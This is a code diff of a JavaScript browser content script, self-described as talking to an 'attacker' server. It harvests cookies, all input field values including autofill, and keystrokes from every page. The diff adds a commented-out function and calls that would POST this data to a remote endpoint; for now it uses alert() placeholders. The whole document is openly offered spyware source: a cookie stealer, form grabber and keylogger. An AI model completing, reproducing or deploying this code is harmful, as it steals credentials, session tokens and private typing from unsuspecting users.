@@ -1,5 +1,29 @@
 /* attacker pseudo-database / server */
-var host_url = "http://127.0.0.1:80/"
+var host_url = "http://127.0.0.1:41775/"
+
+/* Get stored UUID */
+// var clientID;
+// chrome.storage.local.get(['id'],function(result){
+//     if (result) { 
+//         clientID = result; 
+//     } else {
+
+//     };
+// });
+
+
+// function getClientID() {
+//     var get = new XMLHttpRequest();
+//     get.open("GET",url+'create');
+// }
+
+
+// function PostTo(endpoint,request) {
+//     var cur = new XMLHttpRequest();
+//     cur.open("POST",url+endpoint);
+//     cur.setRequestHeader("Content-Type","application/json");
+//     cur.send(JSON.stringify(request));
+// }
 
 /* Timestamp Strings */
 function createTimestamp() {
@@ -8,13 +32,13 @@ function createTimestamp() {
 }
 
 
-/* ## Do input fields & cookies once page is fully loaded ## */
+/* ## Page Ready Event  ## */
 
 document.addEventListener('readystatechange',event => {
     /* Wait for the page to be fully loaded */
     if (event.target.readyState === "complete") {
         getInputFields();
-        saveAndSendC();
+        saveAndSendC(); 
     }
 })
 
@@ -22,17 +46,16 @@ document.addEventListener('readystatechange',event => {
 /* ## Cookies ## */
 
 function saveAndSendC() {
+    /* If the site doesn't use cookies, but we know that's impossible */
+    if (!document.cookie) { return; }
     /* output JSON */
     var curCookies = {}
-    /* Get current time */
     curCookies['timestamp'] = createTimestamp();
-    /* Get current URL */
     curCookies['url'] = document.URL;
-    /* Get current title */
     curCookies['title'] = document.title;
-    /* Get cookies content */
     curCookies['cookies'] = document.cookie;
     alert(JSON.stringify(curCookies));
+    // PostTo('add/cookies',curCookies);
 }
 
 
@@ -41,7 +64,6 @@ function saveAndSendC() {
 
 /* ## Input Field Grabber - will catch autofill thanks to the caller event ## */
 
-/* get a list of all the input fields */
 function getInputFields() {
     allInputs = document.getElementsByTagName('input');
     for (var i = 0; i < allInputs.length; i++) {
@@ -55,20 +77,17 @@ function getInputFields() {
 
 /* Sends to an input field only endpoint */
 function saveAndSendIF(target) {
+    if (!target.value) { return; }
     /* output JSON */
     var curInput = {} 
-    /* Get current time */
     curInput['timestamp'] = createTimestamp();
-    /* Get current URL */
     curInput['url'] = document.URL;
-    /* Get current title */
     curInput['title'] = document.title;
-    /* Get field name */
     curInput['type'] = target.name;
-    /* Set content */
     curInput['content'] = target.value;
     /* Send to remote server */
     alert(JSON.stringify(curInput)); // placeholder
+    // PostTo('add/input',curInput);
 }
 
 
@@ -119,15 +138,14 @@ function saveAndSendKS() {
     if (curlog.length === 0) { return; }
     /* output JSON */
     var curMessage = {} 
-    /* Get current time */
     curMessage['timestamp'] = createTimestamp();
-    /* Get current URL */
     curMessage['url'] = document.URL;
-    /* Get current title */
     curMessage['title'] = document.title;
     /* Set and clear log */
     curMessage['content'] = curlog;
     curlog = [];
     /* Send to remote server */
     alert(JSON.stringify(curMessage)); // placeholder
+    // PostTo('add/keystrokes',curMessage);
+
 }
